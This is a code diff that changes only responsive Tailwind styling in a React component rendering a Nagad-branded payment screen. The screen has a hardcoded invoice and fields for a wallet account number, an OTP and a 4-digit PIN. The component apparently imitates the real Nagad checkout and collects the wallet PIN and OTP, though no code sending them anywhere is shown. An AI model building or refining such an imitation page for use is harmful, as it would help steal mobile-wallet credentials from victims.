@@ -109,7 +109,7 @@ const NagadPayment = () => {
             type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
             onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
             onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
-            className="w-5 h-6 sm:w-6 sm:h-7 bg-white rounded text-center text-gray-800 text-[10px] sm:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
+            className="w-5 h-6 min-[375px]:w-6 min-[375px]:h-7 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
           />
         );
       }
@@ -129,7 +129,7 @@ const NagadPayment = () => {
           type="password" inputMode="numeric" maxLength={1} value={digit}
           onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
           onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
-          className="w-5 h-6 sm:w-6 sm:h-7 bg-white rounded text-center text-gray-800 text-[10px] sm:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
+          className="w-5 h-6 min-[375px]:w-6 min-[375px]:h-7 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
         />
       ))}
     </div>
@@ -137,78 +137,78 @@ const NagadPayment = () => {
 
   return (
     <div className="h-[100dvh] w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
-      <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 sm:border-[8px] border-black"
+      <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
         
         {/* Language Toggle */}
-        <div className="flex justify-end p-1.5 sm:p-2 shrink-0">
+        <div className="flex justify-end p-1.5 min-[375px]:p-2 shrink-0">
           <div className="flex overflow-hidden border border-white/50 rounded-sm">
             <button onClick={() => setLanguage('bn')}
-              className={`px-2 sm:px-3 py-0.5 sm:py-1 text-[10px] sm:text-xs font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
+              className={`px-2 min-[375px]:px-3 py-0.5 min-[375px]:py-1 text-[10px] min-[375px]:text-xs font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
             <button onClick={() => setLanguage('en')}
-              className={`px-2 sm:px-3 py-0.5 sm:py-1 text-[10px] sm:text-xs font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
+              className={`px-2 min-[375px]:px-3 py-0.5 min-[375px]:py-1 text-[10px] min-[375px]:text-xs font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
           </div>
         </div>
 
         <div className="flex-1 flex flex-col justify-evenly min-h-0">
               {/* Cart Icon & Title */}
               <div className="flex flex-col items-center shrink-0">
-                <img src={cartIcon} alt="Cart" className="w-10 h-10 sm:w-16 sm:h-16 mb-1 sm:mb-2 object-contain" />
-                <h1 className="text-[#ccc] text-sm sm:text-lg font-bold">{t.title}</h1>
+                <img src={cartIcon} alt="Cart" className="w-10 h-10 min-[375px]:w-16 min-[375px]:h-16 mb-1 min-[375px]:mb-2 object-contain" />
+                <h1 className="text-[#ccc] text-sm min-[375px]:text-lg font-bold">{t.title}</h1>
               </div>
 
               {/* Invoice Details */}
-              <div className="px-6 sm:px-8 shrink-0">
-                <div className="space-y-0.5 sm:space-y-1.5">
+              <div className="px-6 min-[375px]:px-8 shrink-0">
+                <div className="space-y-0.5 min-[375px]:space-y-1.5">
                   <div className="flex">
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm w-24 sm:w-32">{t.invoiceNo}</span>
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm">B255527202718B</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.invoiceNo}</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">B255527202718B</span>
                   </div>
                   <div className="flex">
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm w-24 sm:w-32">{t.totalAmount}</span>
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm">BDT 434</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.totalAmount}</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT 434</span>
                   </div>
                   <div className="flex">
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm w-24 sm:w-32">{t.charge}</span>
-                    <span className="text-[#ccc] font-bold text-xs sm:text-sm">BDT 0</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.charge}</span>
+                    <span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT 0</span>
                   </div>
                 </div>
               </div>
 
               {/* Input Section */}
-              <div className="flex flex-col items-center px-4 sm:px-5 shrink-0">
+              <div className="flex flex-col items-center px-4 min-[375px]:px-5 shrink-0">
                 {showPinView ? (
                   <div className="flex flex-col items-center">
-                    <p className="text-[#ccc] text-center text-xs sm:text-base font-bold mb-2 sm:mb-4">{t.enterPin}</p>
+                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterPin}</p>
                     {renderPinInputs()}
-                    <p className={`text-yellow-300 text-[10px] sm:text-sm font-bold mt-2 sm:mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>
+                    <p className={`text-yellow-300 text-[10px] min-[375px]:text-sm font-bold mt-2 min-[375px]:mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>
                       {pinError || "placeholder"}
                     </p>
                   </div>
                 ) : showOtpView ? (
                   <div className="flex flex-col items-center w-full">
-                    <p className="text-[#ccc] text-center text-xs sm:text-base font-bold mb-2 sm:mb-4">{t.enterOtp}</p>
+                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterOtp}</p>
                     <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                       onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                       placeholder="XXXXXX"
-                      className="w-4/5 h-7 sm:h-8 bg-white rounded text-center text-gray-800 text-xs sm:text-sm font-medium tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400 placeholder:tracking-[0.3em]"
+                      className="w-4/5 h-7 min-[375px]:h-8 bg-white rounded text-center text-gray-800 text-xs min-[375px]:text-sm font-medium tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400 placeholder:tracking-[0.3em]"
                     />
                     {otpResent && (
-                      <p className="text-[#ccc] text-[9px] sm:text-[11px] font-bold mt-2 sm:mt-3 whitespace-nowrap">{t.otpResent}</p>
+                      <p className="text-[#ccc] text-[9px] min-[375px]:text-[11px] font-bold mt-2 min-[375px]:mt-3 whitespace-nowrap">{t.otpResent}</p>
                     )}
                   </div>
                 ) : (
                   <div className="flex flex-col items-center">
-                    <p className="text-[#ccc] text-center text-xs sm:text-base font-bold mb-2 sm:mb-4">{t.accountNumber}</p>
+                    <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.accountNumber}</p>
                     {renderPhoneInputs()}
                     {phoneError && (
-                      <p className="text-yellow-300 text-[10px] sm:text-sm font-medium mt-2 sm:mt-3">{phoneError}</p>
+                      <p className="text-yellow-300 text-[10px] min-[375px]:text-sm font-medium mt-2 min-[375px]:mt-3">{phoneError}</p>
                     )}
                   </div>
                 )}
 
                 {!showOtpView && !showPinView && (
-                  <p className="text-[#ccc] text-center text-[9px] sm:text-xs leading-tight font-bold mt-3 sm:mt-5 px-2">
+                  <p className="text-[#ccc] text-center text-[9px] min-[375px]:text-xs leading-tight font-bold mt-3 min-[375px]:mt-5 px-2">
                     {t.termsText}
                     <span className="text-[#ccc] font-bold underline">{t.termsLink}</span>
                   </p>
@@ -216,24 +216,24 @@ const NagadPayment = () => {
               </div>
 
               {/* Buttons */}
-              <div className="flex gap-4 sm:gap-8 justify-center shrink-0">
+              <div className="flex gap-4 min-[375px]:gap-8 justify-center shrink-0">
                 <button
                   onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-                  className="px-4 sm:px-6 bg-white text-[#C41E3A] py-0.5 sm:py-1 rounded text-[8px] sm:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                  className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                 >{t.proceed}</button>
                 {showOtpView && (
                   <button onClick={handleResendOtp}
-                    className="px-3 sm:px-4 bg-white text-[#C41E3A] py-0.5 sm:py-1 rounded text-[8px] sm:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                    className="px-3 min-[375px]:px-4 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                   >{t.resendCode}</button>
                 )}
                 <button onClick={handleClose}
-                  className="px-4 sm:px-6 bg-white text-[#C41E3A] py-0.5 sm:py-1 rounded text-[8px] sm:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                  className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                 >{t.close}</button>
               </div>
 
               {/* Nagad Logo */}
               <div className="flex justify-center shrink-0">
-                <img src={nagadLogoWhite} alt="Nagad" className="h-8 sm:h-12 object-contain" />
+                <img src={nagadLogoWhite} alt="Nagad" className="h-8 min-[375px]:h-12 object-contain" />
               </div>
         </div>
       </div>
